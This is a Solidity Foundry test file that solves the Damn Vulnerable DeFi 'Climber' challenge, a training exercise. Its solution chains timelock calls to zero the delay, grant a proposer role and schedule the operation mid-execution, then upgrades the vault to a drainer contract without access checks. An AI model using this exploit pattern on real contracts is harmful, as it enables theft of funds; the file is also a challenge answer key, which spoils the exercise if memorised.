// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // Steps to pass this challenge:
        // 1) Deploy VulnerableUpgrade implementation contract and Scheduler helper contract
        // 2) Build and encode arrays needed for timelock.execute() call
        // 3) Save exact copies of the arrays in the Scheduler contract to be used in timelock.schedule() call
        // 4) Initiate attack through timelock.execute(), with the encoded calls needed to solve the challenge
        //      (operations encoded within execute call so the timelock contract is seen as msg.sender)
        //      4a) Update delay in timelock to 0 because timelock.getOperationState considers an operation ReadyForExecution when block.timestamp >= readyAtTimestamp, setting delay to 0 allows scheduling and execution within the same transaction.
        //      4b) Grant proposer role to the Scheduler contract we deployed so we have the necessary permissions to call timelock.schedule
        //      4c) Call timelock.schedule() through scheduler.schedule() with the same exact inputs we called timelock.execute() with so we can add the operation and make it eligible for execution before the execution call reaches getOperationState() check
        //      4d) Upgrade the vaults implementation address to the VulnerableUpgrade contract we deployed and call vulnerableUpgrade.drain via upgradeToAndCall using the timelock’s owner privileges after bypassing the timelock’s scheduling and delayed execution process

        // deploy extra contracts needed for challenge
        VulnerableUpgrade vulnerableUpgrade = new VulnerableUpgrade();
        Scheduler scheduler = new Scheduler(timelock);

        // set state needed for arrays and execute call
        bytes32 salt = 0;
        uint64 newDelay = 0;
        uint256 amount = token.balanceOf(address(vault));
        bytes memory encodedCall = abi.encodeCall(vulnerableUpgrade.drain, (address(token), recovery, amount));

        // build targets array
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(scheduler);
        targets[3] = address(vault);

        // build values array (all 0 since no ETH value is sent)
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        // build dataElements array
        bytes[] memory dataElements = new bytes[](4);
        // update delay so we can execute and schedule simultaneously
        dataElements[0] = abi.encodeCall(timelock.updateDelay, (newDelay));
        // grant our scheduler contract the proposer role
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(scheduler)));
        // schedule the execute operation through our scheduler contract that now has the proposer role
        dataElements[2] = abi.encodeCall(scheduler.schedule, ());
        // upgrade the vault contract to a new malicious implementation that allows us to withdraw all DVT and call it with encoded data to rescue funds
        dataElements[3] = abi.encodeCall(vault.upgradeToAndCall, (address(vulnerableUpgrade), encodedCall));

        // save arrays built above into our scheduler contract to avoid self-referential calldata issue caused by trying to directly call schedule within an execute call
        scheduler.setUp(targets, values, dataElements, salt);
        // execute operations
        timelock.execute(targets, values, dataElements, salt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

// imports needed for helper contracts
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

// vulnerable implementation contract to replace ClimberVault.sol so we can withdraw all DVT from the vault
// need to inherit UUPSUpgradeable to satisfy ERC1967InvalidImplementation error
contract VulnerableUpgrade is UUPSUpgradeable {
    // intentionally lacking access controls for exploit payload
    function drain(address token, address receiver, uint256 amount) external {
        // send tokens to arbitrary address, bypassing all checks and access controls
        IERC20(token).transfer(receiver, amount);
    }

    // required by UUPSUpgradeable
    function _authorizeUpgrade(address newImplementation) internal override {}
}

// helper contract to handle timelock.schedule() call so we can avoid self-referential data errors when building dataElements array
contract Scheduler {
    error ContractIsAlreadySetUp();

    ClimberTimelock timelock;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(ClimberTimelock timelock_) {
        timelock = timelock_;
    }

    // setup helper contract
    function setUp(address[] memory targets_, uint256[] memory values_, bytes[] memory dataElements_, bytes32 salt_)
        external
    {
        // ensure contract is setUp only once
        if (targets.length != 0) {
            revert ContractIsAlreadySetUp();
        }
        // save arrays and salt needed for timelock.schedule() call within our timelock.execute() call
        targets = targets_;
        values = values_;
        dataElements = dataElements_;
        salt = salt_;
    }

    // schedule the operation that is already ongoing, after this contract is granted the proposer role earlier in the same transaction
    function schedule() external {
        // schedule operation from timelock contract while it is being executed to avoid timelock.NotReadyForExecution() error
        timelock.schedule(targets, values, dataElements, salt);
    }
}
